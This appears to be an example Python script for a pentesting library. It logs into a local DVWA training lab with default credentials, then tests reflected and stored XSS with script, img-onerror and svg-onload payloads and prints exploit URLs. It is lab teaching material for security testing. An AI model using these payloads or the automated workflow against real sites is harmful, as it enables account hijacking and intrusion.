#!/usr/bin/env python3
"""
DVWA Proper Workflow Example
This example demonstrates the correct DVWA testing sequence:
1. Login to DVWA login page
2. Get redirected to index page
3. Navigate to specific vulnerability pages
4. Test vulnerabilities

Prerequisites: DVWA running on localhost:8080 with database setup
"""

import asyncio
import re
from logicpwn.core.runner import AsyncRequestRunner

class DVWASession:
    """Manages DVWA session and navigation"""
    
    def __init__(self):
        self.session_cookie = None
        self.base_url = "http://localhost:8080"
        
    async def login(self):
        """Step 1: Login to DVWA"""
        print("🔐 Step 1: Logging into DVWA...")
        
        async with AsyncRequestRunner() as runner:
            try:
                # Get login page and extract CSRF token
                login_page_response = await runner.send_request(f"{self.base_url}/login.php")
                print(f"   📄 Login page status: {login_page_response.status_code}")
                
                if login_page_response.status_code != 200:
                    print("❌ Cannot access login page")
                    return False
                
                # Extract CSRF token
                csrf_token = None
                token_match = re.search(r'user_token["\']?\s*value=["\']([^"\']+)', login_page_response.body)
                if token_match:
                    csrf_token = token_match.group(1)
                    print(f"   🛡️  Found CSRF token: {csrf_token[:20]}...")
                
                # Prepare login data
                login_data = {
                    "username": "admin",
                    "password": "admin",
                    "Login": "Login"
                }
                
                if csrf_token:
                    login_data["user_token"] = csrf_token
                
                # Perform login
                print("   🔑 Submitting login credentials...")
                login_response = await runner.send_request(
                    f"{self.base_url}/login.php",
                    method="POST",
                    data=login_data
                )
                
                # Extract session cookie
                set_cookie = login_response.headers.get("Set-Cookie", "")
                cookie_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
                if cookie_match:
                    self.session_cookie = cookie_match.group(1)
                    print(f"   ✅ Login successful! Session: {self.session_cookie[:10]}...")
                    return True
                else:
                    print("   ❌ Login failed - no session cookie received")
                    return False
                    
            except Exception as e:
                print(f"   ❌ Login error: {e}")
                return False
    
    async def access_index_page(self):
        """Step 2: Access DVWA index page after login"""
        print("\n📋 Step 2: Accessing DVWA index page...")
        
        if not self.session_cookie:
            print("❌ No valid session - cannot access index page")
            return False
        
        async with AsyncRequestRunner() as runner:
            try:
                headers = {"Cookie": f"PHPSESSID={self.session_cookie}"}
                
                # Access index page
                index_response = await runner.send_request(f"{self.base_url}/index.php", headers=headers)
                print(f"   📄 Index page status: {index_response.status_code}")
                
                if index_response.status_code == 200:
                    # Check for successful login indicators
                    if "logout" in index_response.body.lower():
                        print("   ✅ Successfully authenticated - logout link found")
                    if "welcome" in index_response.body.lower():
                        print("   👋 Welcome message detected")
                    if "vulnerabilities" in index_response.body.lower():
                        print("   🎯 Vulnerabilities menu available")
                    
                    return True
                else:
                    print(f"   ❌ Cannot access index page: {index_response.status_code}")
                    return False
                    
            except Exception as e:
                print(f"   ❌ Index page error: {e}")
                return False
    
    async def navigate_to_vulnerability(self, vuln_name, vuln_path):
        """Step 3: Navigate to specific vulnerability page"""
        print(f"\n🎯 Step 3: Navigating to {vuln_name}...")
        
        if not self.session_cookie:
            print("❌ No valid session - cannot access vulnerability page")
            return None
        
        async with AsyncRequestRunner() as runner:
            try:
                headers = {"Cookie": f"PHPSESSID={self.session_cookie}"}
                
                # Access vulnerability page
                vuln_url = f"{self.base_url}{vuln_path}"
                vuln_response = await runner.send_request(vuln_url, headers=headers)
                print(f"   📄 {vuln_name} page status: {vuln_response.status_code}")
                
                if vuln_response.status_code == 200:
                    print(f"   ✅ Successfully accessed {vuln_name}")
                    
                    # Analyze the page
                    if "form" in vuln_response.body.lower():
                        form_count = vuln_response.body.lower().count("<form")
                        print(f"   📝 Found {form_count} form(s)")
                    
                    if "input" in vuln_response.body.lower():
                        input_count = vuln_response.body.lower().count("<input")
                        print(f"   📝 Found {input_count} input field(s)")
                    
                    if vuln_response.security_analysis:
                        if vuln_response.security_analysis.has_csrf_tokens:
                            print(f"   🛡️  CSRF protection detected")
                    
                    return vuln_response
                else:
                    print(f"   ❌ Cannot access {vuln_name}: {vuln_response.status_code}")
                    return None
                    
            except Exception as e:
                print(f"   ❌ {vuln_name} navigation error: {e}")
                return None

async def test_reflected_xss():
    """Step 4: Test Reflected XSS following proper workflow"""
    print("\n🚀 Step 4: Testing Reflected XSS...")
    
    # Create DVWA session
    dvwa = DVWASession()
    
    # Follow proper sequence: login → index → vulnerability
    if not await dvwa.login():
        print("❌ Login failed - cannot proceed")
        return
    
    if not await dvwa.access_index_page():
        print("❌ Index access failed - cannot proceed")
        return
    
    # Navigate to Reflected XSS page
    xss_response = await dvwa.navigate_to_vulnerability("Reflected XSS", "/vulnerabilities/xss_r/")
    if not xss_response:
        print("❌ Cannot access XSS page - cannot proceed")
        return
    
    # Now test XSS payloads
    print("\n🔍 Step 5: Testing XSS payloads...")
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={dvwa.session_cookie}"}
        
        xss_payloads = [
            "<script>alert('Reflected XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for i, payload in enumerate(xss_payloads, 1):
            print(f"\n   {i}. Testing payload: {payload}")
            
            # Test the payload
            xss_url = f"{dvwa.base_url}/vulnerabilities/xss_r/"
            test_response = await runner.send_request(
                xss_url,
                method="GET",
                params={"name": payload},
                headers=headers
            )
            
            if test_response.status_code == 200:
                # Check if payload is reflected
                if payload in test_response.body:
                    print(f"      ✅ Payload reflected in response!")
                    
                    # Check encoding
                    if "&lt;" in test_response.body or "&gt;" in test_response.body:
                        print(f"      🛡️  Payload appears to be encoded (safe)")
                    else:
                        print(f"      🚨 Payload NOT encoded - XSS vulnerability!")
                        
                        # Generate exploit URL
                        exploit_url = f"{xss_url}?name={payload.replace(' ', '+')}"
                        print(f"      🔗 Exploit URL: {exploit_url}")
                        
                else:
                    print(f"      ❌ Payload not found in response")
            else:
                print(f"      ❌ Request failed: {test_response.status_code}")

async def test_stored_xss():
    """Test Stored XSS following proper workflow"""
    print("\n🚀 Testing Stored XSS...")
    
    dvwa = DVWASession()
    
    # Follow workflow
    if not await dvwa.login():
        return
    if not await dvwa.access_index_page():
        return
    
    # Navigate to Stored XSS
    xss_response = await dvwa.navigate_to_vulnerability("Stored XSS", "/vulnerabilities/xss_s/")
    if not xss_response:
        return
    
    # Test stored XSS
    print("\n🔍 Testing Stored XSS payload...")
    
    async with AsyncRequestRunner() as runner:
        headers = {"Cookie": f"PHPSESSID={dvwa.session_cookie}"}
        
        # Submit XSS payload to guestbook
        payload = "<script>prompt('Stored XSS')</script>"
        stored_data = {
            "txtName": "Test User",
            "mtxMessage": payload,
            "btnSign": "Sign Guestbook"
        }
        
        submit_response = await runner.send_request(
            f"{dvwa.base_url}/vulnerabilities/xss_s/",
            method="POST",
            data=stored_data,
            headers=headers
        )
        
        if submit_response.status_code == 200:
            print("   ✅ Payload submitted to guestbook")
            
            # Check if payload is stored and executed
            if payload in submit_response.body:
                print("   🚨 Stored XSS vulnerability confirmed!")
                print("   📝 Payload permanently stored in database")
            else:
                print("   🛡️  Payload appears to be filtered or encoded")

async def main():
    """Run complete DVWA workflow testing"""
    print("🎯 DVWA Proper Workflow Testing")
    print("=" * 60)
    print("Following correct sequence: login → index → vulnerabilities")
    print()
    
    # Check DVWA availability first
    async with AsyncRequestRunner() as runner:
        try:
            response = await runner.send_request("http://localhost:8080")
            if response.status_code != 200:
                print("❌ DVWA not accessible on localhost:8080")
                print("💡 Run: docker run -d -p 8080:80 vulnerables/web-dvwa:latest")
                return
        except Exception as e:
            print(f"❌ Cannot connect to DVWA: {e}")
            return
    
    print("✅ DVWA is accessible - starting workflow tests")
    
    # Test Reflected XSS with proper workflow
    await test_reflected_xss()
    
    # Test Stored XSS with proper workflow  
    await test_stored_xss()
    
    print("\n🎉 DVWA workflow testing completed!")
    print("\n📚 What we demonstrated:")
    print("• Proper DVWA login sequence")
    print("• Session management and navigation")
    print("• Vulnerability page access")
    print("• Real XSS testing with payloads")
    print("• Exploit URL generation")

if __name__ == "__main__":
    asyncio.run(main())
